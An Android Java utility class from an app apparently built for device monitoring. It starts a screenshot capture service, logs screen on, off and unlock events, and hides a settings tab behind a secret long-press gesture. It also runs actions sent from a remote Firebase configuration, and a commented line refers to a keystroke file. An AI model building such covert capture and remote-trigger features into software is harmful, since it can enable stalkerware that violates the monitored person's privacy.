package com.vikasyadavnsit.cdc.utils;

import static android.app.Activity.RESULT_OK;
import static android.content.Context.ALARM_SERVICE;
import static com.vikasyadavnsit.cdc.constants.AppConstants.MEDIA_PROJECTION_REQUEST_CODE;

import android.app.Activity;
import android.app.AlarmManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.CountDownTimer;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.fragment.HomeFragment;
import com.vikasyadavnsit.cdc.fragment.PlayFragment;
import com.vikasyadavnsit.cdc.fragment.SettingsFragment;
import com.vikasyadavnsit.cdc.receiver.StatisticsBroadcastReceiver;
import com.vikasyadavnsit.cdc.services.ScreenshotService;

import java.lang.reflect.Type;
import java.util.Map;

public class ActionUtils {

    private static Handler handler = new Handler();
    private static boolean isLongPress = false;
    private static boolean isCounting = false;
    private static int pressCount = 0;
    private static CountDownTimer countDownTimer;
    private static Activity context;

    public static void handleButtonPress(AppCompatActivity activity) {
        context = activity;

        //Handle Button Presses
        activity.findViewById(R.id.main_navigation_request_play_button).setOnClickListener(view -> {
            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new PlayFragment());

            // Todo : databaseutil will configure a reset functionality

            //CDCFileReader.readAndCreateTemporaryFile(FileMap.KEYSTROKE);
        });

        activity.findViewById(R.id.main_navigation_request_home_button).setOnClickListener(view -> {
            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
        });
        activity.findViewById(R.id.main_navigation_request_settings_button).setOnClickListener(view -> {
            CommonUtil.loadFragment(activity.getSupportFragmentManager(), new SettingsFragment());
        });


        //Handle Touch Listeners
        activity.findViewById(R.id.main_navigation_request_home_button).setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                switch (event.getAction()) {
                    case MotionEvent.ACTION_DOWN:
                        CommonUtil.loadFragment(activity.getSupportFragmentManager(), new HomeFragment());
                        isLongPress = false;
                        handler.postDelayed(settingEnablerRunnable, 3000); // 5 seconds
                        return true;

                    case MotionEvent.ACTION_UP:
                    case MotionEvent.ACTION_CANCEL:
                        if (!isLongPress) {
                            handler.removeCallbacks(settingEnablerRunnable);
                        }
                        return true;
                }
                return false;
            }
        });
    }

    public static void onActivityResult(Activity activity, int requestCode, int resultCode, Intent data) {
        LoggerUtils.d("CommonUtil", "onActivityResult : requestCode : " + requestCode + " resultCode : " + resultCode);
        createMediaProjectionScreenshotServiceIntent(activity, requestCode, resultCode, data);
    }

    public static void registerPhoneStatistics(Activity activity) {
        IntentFilter filter = new IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        activity.registerReceiver(new StatisticsBroadcastReceiver(), filter);
    }

    public static void requestExactAlarmPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }

    public static boolean canScheduleExactAlarms() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            AlarmManager alarmManager = (AlarmManager) context.getSystemService(ALARM_SERVICE);
            return alarmManager.canScheduleExactAlarms();
        }
        return true; // For older versions, exact alarms are always allowed
    }

    public static void startMediaProjectionService(Activity activity) {
        MediaProjectionManager mediaProjectionManager = (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        activity.startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE);
    }

    private static void createMediaProjectionScreenshotServiceIntent(Activity activity, int requestCode, int resultCode, Intent data) {
        if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                Intent serviceIntent = new Intent(activity, ScreenshotService.class);
                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_CODE, resultCode);
                serviceIntent.putExtra(ScreenshotService.EXTRA_RESULT_DATA, data);
                activity.startService(serviceIntent);
            }
        }
    }

    private static Runnable settingEnablerRunnable = () -> {
        isLongPress = true;
        pressCount++;
        // Check if the pressCount reaches 3 within 30 seconds
        if (pressCount == 3) {
            Toast.makeText(context, "Settings Tab Enabled", Toast.LENGTH_SHORT).show();
            context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.VISIBLE);
        }

        // If the timer is not running, start the 30-second timer
        if (!isCounting) {
            startCountDown();
        }
    };

    private static void startCountDown() {
        isCounting = true;
        countDownTimer = new CountDownTimer(20000, 1000) { // 30 seconds countdown
            @Override
            public void onTick(long millisUntilFinished) {
                // No action needed on each tick
            }

            @Override
            public void onFinish() {
                isCounting = false;
                if (pressCount < 3) {
                    context.findViewById(R.id.main_navigation_request_settings_button).setVisibility(View.GONE);
                }
                pressCount = 0; // Reset press count after 30 seconds
            }
        };
        countDownTimer.start();
    }


    public static void performFirebaseAction(Object obj) {
        Type type = new TypeToken<Map<String, User.AppTriggerSettingsData>>() {
        }.getType();
        Map<String, User.AppTriggerSettingsData> appTriggerSettingsDataMap = new Gson().fromJson(new Gson().toJson(obj), type);
        Log.d("ActionUtils", "Processing Remote Firebase Actions");
        //DatabaseUtil dbUtils = DatabaseUtil.getInstance(context);
        appTriggerSettingsDataMap.forEach((key, value) -> {
            if (value.isEnabled()) {
                Log.d("ActionUtils", "Performing Remote Firebase Action for : " + key);
                value.getClickActions().getBiConsumer().accept(context, value);
            }
        });
        ApplicationDataRepository.updateAllRecords(appTriggerSettingsDataMap);
    }

}
